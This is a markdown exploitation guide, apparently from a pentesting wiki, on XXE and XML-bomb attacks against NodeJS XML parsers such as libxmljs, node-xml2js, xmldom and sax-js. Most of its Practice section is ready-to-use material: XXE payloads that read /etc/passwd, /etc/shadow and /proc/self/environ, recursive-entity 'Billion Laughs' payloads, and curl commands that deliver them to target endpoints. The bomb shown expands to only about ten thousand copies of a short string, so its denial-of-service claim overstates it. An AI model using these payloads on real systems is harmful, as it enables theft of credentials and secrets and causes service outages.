---
title: NodeJS XML Parser Exploitation Guide
description: Learn to exploit XXE and XML bomb vulnerabilities in NodeJS parsers like
  libxmljs and xmldom.
keywords:
- NodeJS XML parser
- XXE exploitation
- XML bomb attacks
- libxmljs
- node-xml2js
- xmldom
- security vulnerabilities
---

# NodeJS XML Parser Exploitation

## Context

This article explores the exploitation of XXE (XML External Entity) vulnerabilities and XML bomb attacks in popular NodeJS XML parsers. It assumes a foundational understanding of XML structure and syntax, including entity declaration and DTD basics. Additionally, the reader should be familiar with general XXE injection concepts.

## Theory

### NodeJS XML Parsing Ecosystem

NodeJS XML parsers are JavaScript libraries used for handling XML data in server-side applications. The security of these parsers relies significantly on their default configuration settings and how they handle entity resolution. Unsecured configurations can expose applications to XXE and XML bomb vulnerabilities.

### XXE Vulnerabilities in NodeJS Parsers

Certain NodeJS XML parsers, such as libxmljs, node-xml2js, and xmldom, may inadvertently allow external entity resolution. As a result, they become susceptible to XXE vulnerabilities when not properly configured to block external entities. This allows attackers to read arbitrary files or potentially execute further payloads from injected XML.

### XML Bomb Attacks in NodeJS

XML bomb attacks leverage recursive entity expansions to exhaust system resources, leading to denial of service conditions. For NodeJS, this involves crafting payloads that dramatically increase the size and complexity of XML content through entity expansion, depleting memory or CPU resources.

### Parser-Specific Exploitation Considerations

Each NodeJS XML parser has a unique configuration and vulnerability profile. Exploiters must identify the specific parser used, test for XXE and XML bomb vulnerabilities, and tailor payloads to exploit configuration weaknesses without over-relying on a generic approach.

## Practice

### Exploiting XXE in libxmljs

To exploit an XXE vulnerability in an application using libxmljs:

- Use a payload crafted to read the contents of sensitive files:
  
  ```xml
  <?xml version="1.0"?>
  <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
  <root>&xxe;</root>
  ```

- Send the XML payload to the target application endpoint:
  
  ```bash
  curl -X POST -d @payload.xml http://target-app/upload --header "Content-Type: application/xml"
  ```

Upon successful execution, this will allow access to the contents of `/etc/passwd`, often disclosed in the server's response or logs.

### Exploiting XXE in node-xml2js

To exploit an XXE in node-xml2js, create a payload to extract server environment variables:

- Craft the XML payload:
  
  ```xml
  <?xml version="1.0"?>
  <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///proc/self/environ"> ]>
  <root>&xxe;</root>
  ```

- Deliver the payload to the application's API endpoint:
  
  ```bash
  curl -X POST -d @payload.xml http://target-app/api/xml --header "Content-Type: application/xml"
  ```

This could result in environment variables being leaked through the application's response.

### Triggering XML Bomb in xmldom

XML bombs aim to exhaust system resources:

- Create the 'Billion Laughs' XML bomb payload:
  
  ```xml
  <?xml version="1.0"?>
  <!DOCTYPE lolz [
    <!ENTITY a "1234567890" >
    <!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;" >
    <!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;" >
    <!ENTITY d "&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;" >
  ]>
  <root>&d;</root>
  ```

- Send the bomb to the xmldom-based endpoint:
  
  ```bash
  curl -X POST -d @bomb.xml http://target-app/xmlparse --header "Content-Type: application/xml"
  ```

Successful execution results in the server's CPU and memory spiking, potentially causing a denial of service.

### Testing fast-xml-parser for XXE

Validate whether fast-xml-parser has XXE vulnerabilities:

- Prepare a test payload:

  ```xml
  <?xml version="1.0"?>
  <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
  <root>&xxe;</root>
  ```

- Deploy it to the parsing endpoint:

  ```bash
  curl -X POST -d @payload.xml http://target-app/parse --header "Content-Type: application/xml"
  ```

Analyze the server's response to discover any vulnerabilities.

### Testing xml2json for XXE

Test xml2json parser's strength against XXE:

- Design the XML payload:

  ```xml
  <?xml version="1.0"?>
  <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/hosts"> ]>
  <root>&xxe;</root>
  ```

- Send to the xml2json endpoint:

  ```bash
  curl -X POST -d @payload.xml http://target-app/xml2json --header "Content-Type: application/xml"
  ```

Check the application's behavior to determine vulnerability presence.

### Testing sax-js for XXE and XML Bomb

Evaluate sax-js for both XXE and XML bomb vulnerabilities:

- Test for XXE:
  
  ```xml
  <?xml version="1.0"?>
  <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/shadow"> ]>
  <root>&xxe;</root>
  ```

- Test for XML bomb:

  ```xml
  <?xml version="1.0"?>
  <!DOCTYPE lolz [
    <!ENTITY a "1234567890" >
    <!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;" >
    <!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;" >
    <!ENTITY d "&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;" >
  ]>
  <root>&d;</root>
  ```

- Deliver to SAX endpoint:

  ```bash
  curl -X POST -d @payload.xml http://target-app/sax --header "Content-Type: application/xml"
  ```

Observe to identify how sax-js processes the payloads.

## Tools

- **curl**